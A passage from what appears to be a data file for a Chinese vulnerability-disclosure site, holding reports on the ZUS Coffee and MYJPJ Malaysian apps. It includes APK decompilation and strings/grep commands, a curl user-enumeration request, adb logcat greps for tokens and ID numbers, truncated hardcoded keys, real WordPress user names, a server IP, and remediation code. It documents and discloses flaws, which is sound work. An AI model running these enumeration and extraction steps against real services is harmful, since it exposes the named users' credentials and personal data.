路径搜索、第三方服务与硬编码密钥提取。以下为各阶段的操作命令与说明，开发团队可据此复现审计过程。"},{type:"subheading",text:"1. APK 反编译与文件提取"},{type:"list",items:["将 APK 文件后缀改为 .zip 并解压，获取其中的 lib/arm64-v8a/libapp.so（Flutter AOT 编译产物）","提取 libapp.so 文件，作为后续字符串提取与符号分析的目标","使用 apktool d zuscoffee.apk 反编译 AndroidManifest.xml 与资源文件，定位硬编码密钥"]},{type:"subheading",text:"2. 字符串提取与目录结构分析"},{type:"paragraph",text:"通过 strings 命令对 libapp.so 进行字符串提取，并使用 grep 过滤出 Dart 源文件路径。该命令可将所有 package:love_coffee 前缀的字符串输出到文件，便于后续分析业务模块结构。"},{type:"code",language:"bash",code:'strings libapp.so | grep -i dart && strings libapp.so | grep -i "package:love_coffee" > output/zus_filtered_strings.txt'},{type:"subheading",text:"3. 敏感 API 路径搜索"},{type:"paragraph",text:"使用 grep 对提取的字符串进行二次过滤，分别搜索 v1 与 v3 接口路径。v1 接口主要覆盖余额、购物车、结账、用户与反馈业务；v3 接口则覆盖认证与地区相关功能。"},{type:"code",language:"bash",code:'strings source/libapp.so | grep "/api/v1/"'},{type:"code",language:"bash",code:'strings source/libapp.so | grep "/api/v3/"'},{type:"paragraph",text:"上述命令可完整还原应用的 API 端点清单，结合业务上下文即可判断哪些接口存在未授权访问、参数篡改或越权操作的风险。"},{type:"subheading",text:"4. 第三方服务与硬编码密钥提取"},{type:"paragraph",text:"通过分析 AndroidManifest.xml 中的 meta-data 节点，可提取到 Branch Key 等第三方服务密钥。以下为从 manifest 中提取到的 Branch Key 配置示例（已脱敏）："},{type:"code",language:"xml",code:`<meta-data android:name="io.branch.sdk.BranchKey" 
    android:value="key_live_xxxxxxxxxxxxxxxx"/>`},{type:"warning-box",icon:"fa-exclamation-triangle",text:"注意：Branch Key 为 key_live_ 前缀的生产环境密钥，攻击者无需任何特殊权限即可通过反编译 APK 获取。建议立即轮换该密钥，并将敏感配置迁移至服务端管理。"}]},{heading:"五、API 路径搜索结果",icon:"fa-network-wired",accent:"#2980b9",contents:[{type:"subheading",text:"5.1 API 路径提取方法"},{type:"paragraph",text:'通过 strings source/libapp.so | grep "/api/v1/" 与 strings source/libapp.so | grep "/api/v3/" 命令，从 libapp.so 中提取到完整的 API 路径清单。这些接口覆盖了余额、购物车、结账、用户、反馈、认证、地区等核心业务功能。'},{type:"subheading",text:"5.2 API 按业务功能分类"},{type:"paragraph",text:"根据提取到的 API 路径特征，将其按业务功能划分为四类：余额相关接口、购物车与结账接口、用户与反馈接口、认证与地区接口（v3）。以下为各分类下的具体端点："},{type:"subheading",text:"5.2.1 余额相关接口"},{type:"list",items:["/api/v1/balance/history","/api/v1/balance/reload","/api/v1/balance/gift-card/update-gc","/api/v1/balance/gift-card/view-redeemed","/api/v1/balance/gift-card/view-sent","/api/v1/balance/gift-card/continue-payment"]},{type:"paragraph",text:"余额相关接口覆盖了 ZUS Balance 的历史查询、充值、礼品卡更新、已兑换与已发送礼品卡查看以及继续支付等操作，直接关联用户资金与礼品卡资产。"},{type:"subheading",text:"5.2.2 购物车与结账接口"},{type:"list",items:["/api/v1/cart/add","/api/v1/cart/clear","/api/v1/checkout","/api/v1/checkout/pay","/api/v1/checkout/update/payment_method","/api/v1/orders/continue_payment"]},{type:"paragraph",text:"购物车与结账接口覆盖了加购、清空购物车、结账、支付、更新支付方式以及订单继续支付等核心交易流程，攻击者可借此构造伪造订单或绕过支付校验。"},{type:"subheading",text:"5.2.3 用户与反馈接口"},{type:"list",items:["/api/v1/user/import-contact-v2","/api/v1/feedback/order_product/store"]},{type:"paragraph",text:"用户与反馈接口涉及通讯录导入与订单商品反馈存储，import-contact-v2 接口若未做权限校验，可能被用于批量导入联系人实施社交工程攻击。"},{type:"subheading",text:"5.2.4 认证与地区接口（v3）"},{type:"list",items:["/api/v3/auth/login","/api/v3/auth/register","/api/v3/auth/phone","/api/v3/user/switch_country","/api/v3/countries"]},{type:"paragraph",text:"v3 接口为较新的认证与地区模块，涵盖登录、注册、手机号认证、国家切换与国家列表查询。攻击者可结合泄露的 API 路径批量注册账户或切换地区绕过业务限制。"},{type:"paragraph",text:"掌握完整 API 结构后，攻击者可编写自动化脚本批量注册账户、爬取商品和用户数据、暴力破解密码、进行接口 fuzzing 发现更多漏洞，对系统造成严重的安全威胁。"}]},{heading:"六、敏感数据汇总表",icon:"fa-shield-alt",accent:"#d35400",contents:[{type:"subheading",text:"6.1 硬编码敏感数据清单"},{type:"paragraph",text:"通过 AndroidManifest.xml 与 libapp.so 字符串分析，共发现以下 8 类硬编码敏感数据。所有 Key 值均已脱敏处理。"},{type:"table",headers:["类别","Key 名称","Key（截断显示）","潜在风险"],rows:[["Google API Keys","google_api_key","AIzaSy.....","API 滥用、未经授权的数据访问、资源配额耗尽"],["Google App ID","google_app_id","1:60847.....","第三方应用可能利用该 ID 进行未经授权的调用"],["Crash Reporting","google_crash_reporting_api_key","AIzaSy.....","可伪造崩溃报告，导致敏感数据泄露"],["Facebook App ID","facebook_app_id","173173.....","可能用于伪造登录、滥用 Facebook API"],["Firebase API Key","firebase_database_url","https:api.z.....","若安全规则配置不当，可能导致数据未经授权的读取或写入"],["Google Storage","google_storage_bucket","zuscof.....","配置错误时可能导致敏感文件的上传或下载"],["GCM Sender ID","gcm_defaultSenderId","608474.....","可能被用于未经授权地发送推送通知，导致骚扰或钓鱼攻击"],["Branch Key","io.branch.sdk.BranchKey","key_live_.....","可被利用来操控归因、制造虚假推荐，进而获得不正当奖励或访问敏感深链数据"]]},{type:"warning-box",icon:"fa-exclamation-triangle",text:"高危提示：上述 8 类敏感数据均在客户端硬编码，且部分为生产环境 live 密钥（如 Branch Key 为 key_live_ 前缀）。攻击者无需任何特殊权限即可通过反编译 APK 获取这些凭证，必须立即轮换并迁移至服务端管理。"}]},{heading:"七、WordPress 用户数据泄露",icon:"fa-users",accent:"#c0392b",contents:[{type:"subheading",text:"7.1 WordPress REST API 用户枚举"},{type:"paragraph",text:"发现网站通过公开的 WordPress REST API 接口泄露用户信息，接口地址为 https://zuscoffee.com/wp-json/wp/v2/users。该接口默认开放，无需任何认证即可查询到所有 WordPress 用户的 ID、姓名、个人页面地址、头像 URL 等信息。"},{type:"code",language:"bash",code:`# 枚举 WordPress 用户信息
curl -s https://zuscoffee.com/wp-json/wp/v2/users | jq '.[] | {id, name, slug, link}'`},{type:"subheading",text:"7.2 泄露的用户记录（脱敏）"},{type:"table",headers:["用户 ID","姓名","Slug","个人页面","头像 URL","Woocommerce ID"],rows:[["7","Chrystal Lum","chrystalise","https://zuscoffee.com/author/chrystalise/","https://secure.gravatar.com/avatar/xxxxxxx?s=24&d=mm&r=g","wc_user_7"],["6","Jamie Master","masterbate","https://zuscoffee.com/author/masterbate/","https://secure.gravatar.com/avatar/xxxxxxx?s=24&d=mm&r=g","wc_user_6"],["5","Pineapple Studio","pineapple-studio","https://zuscoffee.com/author/pineapple-studio/","https://secure.gravatar.com/avatar/xxxxxxx?s=24&d=mm&r=g","wc_user_5"],["3","TY","tingyan","https://zuscoffee.com/author/tingyan/","https://secure.gravatar.com/avatar/xxxxxxx?s=24&d=mm&r=g","wc_user_3"],["1","zusadmin","zusadmin","https://zuscoffee.com/author/zusadmin/","https://secure.gravatar.com/avatar/xxxxxxx?s=24&d=mm&r=g","wc_user_1"]]},{type:"paragraph",text:"风险影响：攻击者可获取用户身份信息、个人页面地址以及头像 URL，进而实施定向钓鱼或身份冒用攻击。头像 URL 可被用于伪造用户身份在第三方平台进行社工攻击。其中 ID 为 1 的 zusadmin 为管理员账户，其信息暴露后可能被用于针对性的暴力破解或社会工程学攻击。建议在 WordPress 配置中禁用 /wp-json/wp/v2/users 接口的公开访问。"}]},{heading:"八、漏洞复现工具",icon:"fa-wrench",accent:"#8e44ad",contents:[{type:"subheading",text:"8.1 本次安全审计使用的工具"},{type:"paragraph",text:"以下为本次安全审计中使用的工具，开发团队可参考以复现漏洞："},{type:"impact-grid",cards:[{icon:"fa-key",title:"flutter_secret_exposed",desc:"用于检测 Flutter 应用中的硬编码敏感信息，专门针对 Dart/AOT 编译产物",color:"blue"},{icon:"fa-mobile-alt",title:"MobileAppAnalyzer",desc:"移动应用静态分析工具，用于提取 APK/IPA 中的配置信息与密钥",color:"purple"},{icon:"fa-search",title:"dirleaks",desc:"目录扫描工具，用于发现隐藏的敏感文件和接口",color:"green"},{icon:"fa-bug",title:"Frida",desc:"动态分析工具，用于 Hook 和监控应用运行时行为，分析 libapp.so 导出符号",color:"orange"},{icon:"fa-globe-asia",title:"MalaysianOSINT",desc:"马来西亚地区开源情报收集工具，用于辅助目标信息收集",color:"red"},{icon:"fa-rocket",title:"metasploit-framework",desc:"漏洞利用框架，用于验证漏洞可利用性",color:"yellow"},{icon:"fa-file-code",title:"apktool",desc:"APK 反编译工具，用于分析应用源码和资源",color:"indigo"}]},{type:"image",src:"assets/20250326-enVzY29mZmVl-manifest.png",alt:"ZUS Coffee 漏洞影响链示意图",caption:"图 1：ZUS Coffee 数据泄露影响链示意图"}]},{heading:"九、风险评估与攻击场景",icon:"fa-triangle-exclamation",accent:"#c0392b",contents:[{type:"subheading",text:"9.1 潜在攻击场景"},{type:"impact-grid",cards:[{icon:"fa-bomb",title:"API 滥用与数据窃取",desc:"利用 Google API Keys 和 Crash Reporting API Key 发起大量未经授权的请求，耗尽服务配额或窃取敏感数据；通过 Firebase Database URL 读取或篡改用户订单、个人信息等",color:"red"},{icon:"fa-mask",title:"虚假推荐与会话劫持",desc:"利用 Branch Key 操控深链系统，制造虚假推荐获得不正当奖励；利用 Facebook Client Token 伪造登录请求或劫持用户会话",color:"orange"},{icon:"fa-bell",title:"推送通知滥用",desc:"利用 GCM Sender ID 发送未经授权的推送通知，诱导用户点击钓鱼链接，实施社会工程学攻击",color:"purple"}]},{type:"paragraph",text:"上述攻击场景均基于本次审计中实际提取到的硬编码敏感数据。攻击者无需任何特殊权限即可通过反编译 APK 获取这些凭证，结合泄露的 API 路径清单，可对系统发起多维度的攻击。建议立即对所有泄露的密钥进行轮换，并对 Firebase 安全规则进行重新审查。"},{type:"subheading",text:"9.2 涉及的敏感数据清单"},{type:"paragraph",text:"本次审计涉及的所有敏感数据均从客户端 APK 中提取，无需任何特殊权限即可获取。以下为按风险等级排序的敏感数据清单："},{type:"list",items:["Google API Keys 与 Crash Reporting API Key — 可用于发起未授权请求、耗尽配额、伪造崩溃报告","Firebase Database URL — 若安全规则配置不当，可读取或篡改用户订单与个人信息","Branch Key 深链配置（key_live_ 前缀） — 可操控归因系统，制造虚假推荐获取不正当奖励","Facebook Client Token — 可伪造登录请求或劫持用户会话","GCM Sender ID — 可发送未授权推送通知，诱导钓鱼攻击","APPIER App ID（MY/SG/BN/PH/TH 五国） — 可滥用数据分析与归因服务","OneSignal App ID 与 Notification App Group — 可滥用推送服务","Datadog Client Token 与 App ID — 可伪造或污染监控数据","Live Activities App Group — iOS 实时活动相关配置，可能被滥用"]},{type:"warning-box",icon:"fa-exclamation-triangle",text:"高危提示：上述敏感数据均为客户端硬编码，且涉及马来西亚、新加坡、文莱、菲律宾、泰国五国配置。攻击者通过反编译 APK 即可获取全部凭证，影响范围覆盖整个东南亚市场。建议立即按国家维度逐一轮换所有密钥，并将敏感配置迁移至服务端管理。"}]},{heading:"十、修复建议",icon:"fa-wrench",accent:"#27ae60",contents:[{type:"subheading",text:"10.1 代码混淆与加固"},{type:"paragraph",text:"启用 Flutter 的代码混淆编译选项，对 Dart 代码进行符号混淆，增加逆向难度。"},{type:"code",language:"dart",code:`// Flutter 代码混淆编译命令
flutter build apk --obfuscate --split-debug-info=./debug-symbols

// 发布时使用 --release 模式并启用 R8 混淆
flutter build apk --release --obfuscate --split-debug-info=./debug-symbols --shrink`},{type:"subheading",text:"10.2 敏感数据安全存储"},{type:"paragraph",text:"敏感数据不硬编码在客户端，使用 flutter_secure_storage 进行安全存储，依托 Android Keystore / iOS Keychain 进行硬件级保护。"},{type:"code",language:"dart",code:`import 'package:flutter_secure_storage/flutter_secure_storage.dart';

final storage = FlutterSecureStorage();

// 存储 Token（而非硬编码）
await storage.write(key: 'api_token', value: token);

// 读取 Token
String? token = await storage.read(key: 'api_token');

// 删除 Token
await storage.delete(key: 'api_token');`},{type:"subheading",text:"10.3 综合加固措施"},{type:"list",items:["强化 Firebase 安全规则，配置细粒度的读写权限；定期更新与轮换所有第三方服务密钥；禁用 WordPress /wp-json/wp/v2/users 接口的公开访问","加固深链安全机制，对 Branch Key 进行服务端校验；实施 SSL Pinning 防止中间人攻击；启用运行时环境检测（Root/越狱检测、调试器检测、模拟器检测）","建立 API 监控与日志审计系统，对异常请求进行告警；定期审查子域配置；对开发团队进行安全培训，引入自动化安全扫描工具"]},{type:"success-box",icon:"fa-check-circle",text:"修复验证：完成上述修复后，使用 flutter_secret_exposed 和 MobileAppAnalyzer 重新扫描 APK，确认所有硬编码密钥已被移除；使用 curl 验证 /wp-json/wp/v2/users 接口已返回 401/403；持续监控 7 天确认无异常访问记录。"}]},{heading:"联系方式",icon:"fa-envelope",accent:"#0d6efd",contents:[{type:"subheading",text:"安全研究员信息"},{type:"table",headers:["项目","详情"],rows:[["姓名","钟智强"],["职位","高级安全研究员 | 高级全栈开发工程师 | 计算机视觉专家"],["电子邮件","johnmelodymel@qq.com"],["微信","ctkqiang"]]},{type:"subheading",text:"响应时间承诺"},{type:"list",items:["紧急漏洞问题：24 小时内响应","一般技术咨询：48 小时内回复"]},{type:"subheading",text:"首选沟通渠道"},{type:"list",items:["1. 电子邮件（安全加密通信）","2. 微信语音/视频会议"]},{type:"info-box",icon:"fa-shield-alt",text:"本报告由安全研究员钟智强以善意披露原则提交。如对报告内容有任何疑问或需要进一步的技术支持，请通过上述联系方式直接沟通。所有漏洞细节均以脱敏形式呈现，仅供 ZUS Coffee 开发团队参考修复。"}]},{heading:"十一、结论",icon:"fa-flag-checkered",accent:"#2c3e50",contents:[{type:"conclusion",title:"ZUS Coffee 移动应用源码泄露总结",text:"ZUS Coffee 移动应用的安全审计揭示了 Flutter 应用在缺乏代码混淆和加固情况下的严重安全隐患。通过 APK 反编译、libapp.so 字符串提取和 Frida 动态分析，完整的业务逻辑、API 路径、硬编码密钥以及 WordPress 用户数据均被成功提取。该漏洞利用门槛极低，仅需标准逆向工具即可复现，建议 ZUS Coffee 立即轮换所有泄露的密钥，启用代码混淆，并将敏感配置迁移至服务端管理。"},{type:"info-box",icon:"fa-lightbulb",text:"安全提示：Flutter 应用并非天然安全，未启用 --obfuscate 编译的 Flutter 产物可被完整逆向。建议开发团队在发布前进行移动应用安全检测，将安全审计纳入 CI/CD 流程，定期进行第三方渗透测试，以持续保障应用安全。"}]}]},{id:"myjpj-data-leak",title:"MYJPJ 移动应用数据泄露",date:"2025-03-24",severity:"critical",cvss:9.1,description:"涉及个人身份信息及 API 凭证的未授权访问漏洞。MYJPJ 马来西亚陆路交通局官方移动应用通过 Flutter 框架开发，日志中暴露了大量敏感个人信息。",tags:[{label:"PDPA 违规",icon:"fa-user-shield",color:"blue"},{label:"数据泄露",icon:"fa-database",color:"purple"},{label:"Flutter",icon:"fa-mobile-alt",color:"pink"},{label:"马来西亚",icon:"fa-globe",color:"yellow"}],target:"MYJPJ (myjpj.jpj.gov.my)",country:"马来西亚",cnvdId:"CNVD-C-2025-176294",originalUrl:"",framework:"Flutter / Laravel",reportSections:[{heading:"善意声明",icon:"fa-heart",accent:"#e74c3c",contents:[{type:"info-box",icon:"fa-heart",text:'作为一名怀着赤诚之心的安全研究员，我谨在此郑重声明：本次安全审计的唯一目的是帮助改进系统安全性，为保护用户数据安全尽一份力。报告中所有敏感信息均已进行脱敏处理，以防被不法分子利用。我始终秉持"善意披露、负责任报告"的原则，希望通过专业的漏洞发现和及时报告，协助开发团队尽快修复安全隐患。在此过程中，我严格遵守相关法律法规，绝无任何破坏或恶意利用的企图。衷心期待通过白帽黑客与开发团队的良性互动，共同为政府和企业的信息安全保驾护航，为广大用户筑起更坚实的数据保护屏障。'}]},{heading:"一、漏洞概述",icon:"fa-bug",accent:"#e67e22",contents:[{type:"subheading",text:"1.1 漏洞基本信息"},{type:"paragraph",text:"MYJPJ 是马来西亚陆路交通局（Jabatan Pengangkutan Jalan, JPJ）的官方移动应用，基于 Flutter 跨平台框架开发，后端使用 PHP Laravel 框架部署在 F5 BIG-IP 负载均衡之后。应用为马来西亚车主提供车辆信息查询、驾照管理、summons 查询、道路税更新等政务服务。通过 adb logcat 日志分析发现，开发团队在调试阶段直接将用户的敏感个人信息和系统认证凭证以明文形式打印到控制台日志中，任何能够访问设备日志的应用或人员均可读取这些数据。"},{type:"table",headers:["属性","详情"],rows:[["漏洞编号","CNVD-C-2025-176294"],["CVSS 评分","9.1 (Critical)"],["危害等级","严重 (Critical)"],["目标","MYJPJ (myjpj.jpj.gov.my)"],["发现日期","2025-03-20"],["漏洞类型","敏感数据明文日志输出 / 个人信息泄露"],["开发框架","Flutter (Dart) / Laravel PHP"],["后端服务器 IP","110.159.245.15"],["负载均衡","F5 BIG-IP (Server: BigIP)"],["Web 框架","Laravel PHP Framework (X-Powered-By: PHP/7.4.x)"]]},{type:"subheading",text:"1.2 应用架构"},{type:"impact-grid",cards:[{icon:"fa-mobile-alt",title:"Flutter 前端",desc:"基于 Flutter 跨平台框架开发，使用 Dart 语言，应用日志通过 debugPrint / print 输出到 Android logcat",color:"blue"},{icon:"fa-server",title:"Laravel 后端",desc:"PHP Laravel 框架部署，提供 RESTful API 接口，处理车辆信息查询、驾照管理、summons 查询等政务服务",color:"purple"},{icon:"fa-network-wired",title:"F5 BIG-IP 负载均衡",desc:"F5 BIG-IP 负载均衡器代理后端服务器，Server: BigIP，隐藏真实后端服务器 IP",color:"orange"},{icon:"fa-key",title:"API 认证",desc:"使用 Bearer Token / JWT 进行 API 认证，Token 直接打印到日志中，存在凭证泄露风险",color:"red"},{icon:"fa-database",title:"敏感数据",desc:"日志中暴露身份证号 (noic/nokp)、车牌号 (nokenderaan)、家庭住址 (addres1)、用户照片 (image) 等敏感个人信息",color:"red"}]}]},{heading:"二、技术取证方法",icon:"fa-microscope",accent:"#8e44ad",contents:[{type:"paragraph",text:"漏洞发现通过标准的 Android 调试桥（adb）日志分析方法完成。在一台已 Root 的测试设备上安装 MYJPJ 应用，注册并登录测试账号后，执行各种功能操作（查询车辆信息、查看 summons 等），同时通过 adb logcat 实时捕获应用输出的日志。在日志中发现大量包含敏感信息的 print / debugPrint 输出。"},{type:"code",code:`# 步骤1：连接设备并确认 adb 正常工作
adb devices
adb shell getprop ro.build.version.release

# 步骤2：清除历史日志，开始新的日志捕获
adb logcat -c

# 步骤3：过滤 MYJPJ 应用相关的日志（Flutter 应用标签通常为 flutter / Dart）
adb logcat -v time | grep -iE "(flutter|dart|myjpj|jpj)" > myjpj_logcat.txt

# 步骤4：在应用中执行操作（登录、查询车辆、查询 summons 等）
# 然后在日志中搜索敏感关键词

# 步骤5：从日志中提取敏感信息
grep -iE "(nokp|noic|token|password|bearer|nokenderaan|address|birth)" myjpj_logcat.txt

# 步骤6：统计日志中的敏感字段数量
grep -oE "(nokp|noic|token|password)=[^ ,]*" myjpj_logcat.txt | wc -l`,language:"bash"},{type:"image",src:"assets/20250324-24f24c.png",alt:"数据泄露影响链示意图",caption:"MYJPJ 数据泄露影响链 — 从日志输出到个人信息暴露的完整攻击链路"}]},{heading:"三、个人信息暴露矩阵",icon:"fa-table",accent:"#c0392b",contents:[{type:"paragraph",text:"通过对日志的全面分析，共发现以下敏感字段直接以明文形式输出到日志中。下表按照字段名、数据类型、PDPA 分类和泄露途径进行分类整理："},{type:"table",headers:["字段名","数据类型","PDPA 分类","泄露途径"],rows:[["Token","API 访问令牌","系统凭证","日志输出"],["ID","API 用户标识","系统标识符","日志输出"],["PASSWORD","API 密钥/JWT 令牌","认证凭证","日志输出"],["AUTH BEARER","HTTP 认证令牌","访问凭证","请求头部"],["noic","车主身份证号","敏感个人信息","API 响应"],["nokp","身份证号码","敏感个人信息","API 响应"],["nokenderaan","车牌号码","车辆信息","API 响应"],["jnsBody","车身类型","车辆信息","API 响应"],["kodKegunaan","车辆用途","车辆信息","API 响应"],["birthDate","出生日期","敏感个人信息","API 响应"],["addres1","地址第一行","个人地址信息","API 响应"],["addres2","地址第二行","个人地址信息","API 响应"],["addres3","地址第三行","个人地址信息","API 响应"],["postcode","邮政编码","位置信息","API 响应"],["city","城市","位置信息","API 响应"],["state","州属","位置信息","API 响应"],["refNo","交易参考号","交易信息","API 响应"],["image","用户照片","生物识别信息","API 响应"],["qrCode","用户二维码","身份验证信息","API 响应"]]},{type:"paragraph",text:"从上述矩阵可以看出，日志中暴露的字段涵盖了系统凭证（Token、ID、PASSWORD、AUTH BEARER）、个人身份信息（noic、nokp、birthDate）、车辆信息（nokenderaan、jnsBody、kodKegunaan）、位置信息（addres1-3、postcode、city、state）、交易信息（refNo）以及生物识别信息（image、qrCode）。共计 19 个敏感字段，其中系统凭证类 4 处、个人信息类 12 类、API 端点 3 个，属于严重的数据泄露事件。"}]},{heading:"四、PDPA 2010 合规性分析",icon:"fa-gavel",accent:"#2980b9",contents:[{type:"paragraph",text:"MYJPJ 应用的日志输出行为违反了马来西亚《个人数据保护法 2010》（Personal Data Protection Act 2010, PDPA）的多项核心原则。以下为详细的违规条款分析："},{type:"list",items:["违反第 7 条 - 安全保护原则（Security Principle）：数据用户必须采取切实可行的措施保护个人数据，防止未经授权的访问、泄露、更改或破坏。将敏感个人数据打印到可被任意应用读取的日志中，完全违反了安全保护义务","违反第 9 条 - 数据保留原则（Retention Principle）：个人数据的保留时间不得超过实现其收集目的所需的时间。调试日志中的个人数据不属于业务必要保留，且未设置自动清理机制，构成不当保留","违反第 10 条 - 数据完整性原则（Data Integrity Principle）：数据用户必须确保个人数据准确、完整且最新。虽然不直接相关，但日志中的数据可能因未更新而过期，影响数据完整性","违反数据最小化原则（Data Minimization）：日志中包含了远超调试所需的敏感信息（完整身份证号、家庭地址、照片等），违反了最小必要原则","违反透明性原则（Transparency Principle）：应用隐私政策中未告知用户其个人数据会被记录到系统日志中，用户对此不知情","同时违反 OWASP Mobile Top 10 2024：M2 不安全数据存储（Insecure Data Storage）、M3 不安全通信（Insecure Communication）、M4 不安全身份验证（Insecure Authentication）"]},{type:"warning-box",icon:"fa-exclamation-triangle",text:"法律后果：根据 PDPA 2010，若确认违规，马来西亚个人数据保护署（PDPC）最高可处以 50 万马币罚款，相关责任人可能面临刑事处罚。此外，根据 OWASP Mobile Top 10 标准，该漏洞同时违反多项安全最佳实践，可能影响政府机构的安全合规评级。"}]},{heading:"五、CNVD 提交流程与时间线",icon:"fa-paper-plane",accent:"#27ae60",contents:[{type:"paragraph",text:"漏洞已按照负责任披露（Responsible Disclosure）原则提交至国家信息安全漏洞共享平台（CNVD），并同步通知马来西亚相关部门。以下为完整的披露时间线："},{type:"table",headers:["日期","事件"],rows:[["2025-03-20","在安全测试中发现日志泄露敏感信息漏洞，完成初步验证"],["2025-03-21","进行深入分析，确认所有泄露字段，撰写详细漏洞报告"],["2025-03-22","通过 CNVD 在线提交系统提交漏洞报告，附件包含完整日志样本和分析报告"],["2025-03-23","CNVD 初审通过，分配漏洞编号 CNVD-C-2025-176294"],["2025-03-24","通过官方邮件 aduan@jpj.gov.my 向马来西亚陆路交通局提交漏洞报告（英文+马来文）"],["2025-03-25","向马来西亚个人数据保护部（PDP Department）提交 PDPA 违规投诉"],["2025-04-02","由于未收到 JPJ 官方回复，向交通部长魏家祥办公室提交跟进报告"],["2025-04-10","CNVD 完成漏洞审核，确认漏洞等级为严重（Critical）"],["2025-04-15","马来西亚媒体开始报道该安全漏洞"]]},{type:"image",src:"assets/CNVD-C-2025-176294.png",alt:"CNVD 漏洞提交截图",caption:"CNVD 漏洞复现证明 — 环境配置文件直接暴露在公网的复现截图"},{type:"image",src:"assets/20250324-24f24c-email.png",alt:"漏洞报告提交邮件截图",caption:"官方邮件提交记录 — 2025年3月24日发送至 aduan@jpj.gov.my"},{type:"image",src:"assets/20250324-24f24c-email-2.png",alt:"向部长办公室提交漏洞报告邮件截图",caption:"魏部长办公室邮件提交截图 — 2025年3月25日跟进报告"}]},{heading:"六、安全审计清单",icon:"fa-clipboard-check",accent:"#16a085",contents:[{type:"paragraph",text:"为系统性评估 MYJPJ 移动应用的安全状况，以下审计清单从日志安全、数据安全和网络安全三个维度列出关键检查项，供开发团队与安全审计人员参考。"},{type:"subheading",text:"6.1 日志安全检查项（优先级：高）"},{type:"list",items:["移除所有包含个人信息的日志打印","实现安全的日志记录机制（自动脱敏敏感字段）","定期清理日志文件，避免长期堆积","对日志访问进行权限控制","加密存储敏感日志信息"]},{type:"subheading",text:"6.2 数据安全检查项（优先级：关键）"},{type:"list",items:["使用安全的加密算法保护敏感数据","实现安全的密钥管理机制","定期更新加密密钥","安全删除临时文件和缓存"]},{type:"subheading",text:"6.3 网络安全检查项（优先级：高）"},{type:"list",items:["启用 SSL 证书固定（SSL Pinning）","实现请求签名机制","防止中间人攻击","限制 API 访问频率","监控异常网络活动","实时安全告警"]}]},{heading:"七、安全加固方案（Dart / Flutter 代码示例）",icon:"fa-shield-halved",accent:"#8e44ad",contents:[{type:"paragraph",text:"针对日志泄露问题，建议从日志安全、本地存储、网络通信和发布配置四个方面进行全面加固。以下为 Flutter/Dart 安全加固的代码示例："},{type:"subheading",text:"7.1 安全日志工具类（SecureLogger）"},{type:"code",language:"dart",code:`import 'package:flutter/foundation.dart';

/// 安全日志工具类 - 自动脱敏敏感字段
class SecureLogger {
  static final List<RegExp> _sensitivePatterns = [
    RegExp(r'\\bnokp\\b[=:]\\s*[^&\\s,}"]+', caseSensitive: false),
    RegExp(r'\\bnoic\\b[=:]\\s*[^&\\s,}"]+', caseSensitive: false),
    RegExp(r'\\btoken\\b[=:]\\s*[^&\\s,}"]+', caseSensitive: false),
    RegExp(r'\\bpassword\\b[=:]\\s*[^&\\s,}"]+', caseSensitive: false),
    RegExp(r'\\bbearer\\s+\\S+', caseSensitive: false),
    RegExp(r'\\baddress?\\b[=:]\\s*[^&\\s,}"]+', caseSensitive: false),
  ];

  static void log(dynamic message) {
    if (kReleaseMode) return; // 发布模式完全禁用调试日志
    final sanitized = _sanitize(message.toString());
    debugPrint(sanitized);
  }

  static String _sanitize(String input) {
    String result = input;
    for (final pattern in _sensitivePatterns) {
      result = result.replaceAllMapped(pattern, (m) {
        final match = m.group(0)!;
        final key = match.substring(0, match.indexOf(':') > 0 ? match.indexOf(':') : match.indexOf('='));
        return '$key:[REDACTED]';
      });
    }
    return result;
  }
}`},{type:"subheading",text:"7.2 安全存储工具类（SecureStorage）"},{type:"code",language:"dart",code:`import 'package:flutter_secure_storage/flutter_secure_storage.dart';

/// 安全存储工具类 - 使用 Keychain/Keystore
class SecureStorage {
  static const _storage = FlutterSecureStorage();

  static Future<void> saveToken(String token) async {
    await _storage.write(key: 'auth_token', value: token);
  }

  static Future<String?> getToken() async {
    return await _storage.read(key: 'auth_token');
  }

  static Future<void> deleteAll() async {
    await _storage.deleteAll();
  }
}`},{type:"subheading",text:"7.3 网络请求安全配置（SecureApiClient）"},{type:"code",language:"dart",code:`/// 网络请求安全配置 - SSL Pinning + 安全头
class SecureApiClient {
  // 生产环境禁用所有日志
  static final bool _enableLogs = kDebugMode;

  static Future<Map<String, dynamic>> get(String url) async {
    // 真实实现应使用 Dio + Certificate Pinning
    if (_enableLogs) {
      SecureLogger.log('GET request to: $url'); // URL 不包含敏感信息
    }
    return {};
  }
}

// 在 main.dart 中配置发布环境
void main() {
  if (kReleaseMode) {
    // 发布模式：完全禁用调试输出
    debugPrint = (String? message, {int? wrapWidth}) {};
  }
  runApp(const MyApp());
}`},{type:"subheading",text:"7.4 SSL Pinning 配置（network-security-config.xml）"},{type:"code",language:"xml",code:`<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
  <domain-config>
    <domain includeSubdomains="true">api.myjpj.gov.my</domain>
    <pin-set>
      <pin digest="SHA-256">BASE64_HASH</pin>
    </pin-set>
  </domain-config>
</network-security-config>`},{type:"success-box",icon:"fa-check-circle",text:"通过以上四层加固，可有效防止敏感数据通过日志泄露、本地存储被窃取、网络通信被劫持，以及发布版本中调试代码残留等问题。建议在 CI/CD 流水线中加入自动化安全扫描，确保加固措施持续有效。"}]},{heading:"八、结论",icon:"fa-flag-checkered",accent:"#c0392b",contents:[{type:"conclusion",title:"漏洞定性结论",text:'MYJPJ 移动应用的敏感数据日志泄露漏洞是一个典型的"开发调试代码残留到生产环境"的安全问题。作为政府官方应用，承载着数百万马来西亚车主的敏感个人信息，此类低级错误本不应发生。该漏洞不仅违反了马来西亚 PDPA 2010 个人数据保护法，也损害了公众对政府数字化服务的信任。建议政府机构在推动数字化转型的同时，将安全作为核心考量，建立完善的安全开发流程和审计机制。'},{type:"subheading",text:"8.1 修复与整改评估矩阵"},{type:"table",headers:["评估维度","当前状态","目标状态","优先级"],rows:[["日志安全","敏感数据明文输出至 logcat","自动脱敏 + 发布模式禁用","紧急"],["数据存储","敏感信息明文存储","Keychain/Keystore 加密存储","高"],["网络通信","未启用 SSL Pinning","证书固定 + 请求签名","高"],["发布配置","调试代码残留","CI/CD 自动化扫描拦截","中"],["合规性","违反 PDPA 2010 多项原则","完成 DPIA 评估 + 合规整改","高"],["应急响应","无数据泄露应急机制","建立应急响应预案 + 定期演练","中"]]},{type:"subheading",text:"8.2 整改建议时间线"},{type:"list",items:["立即措施（24小时内）：发布紧急更新，移除所有敏感数据的日志输出；通知所有用户建议更新应用；重置可能泄露的 API 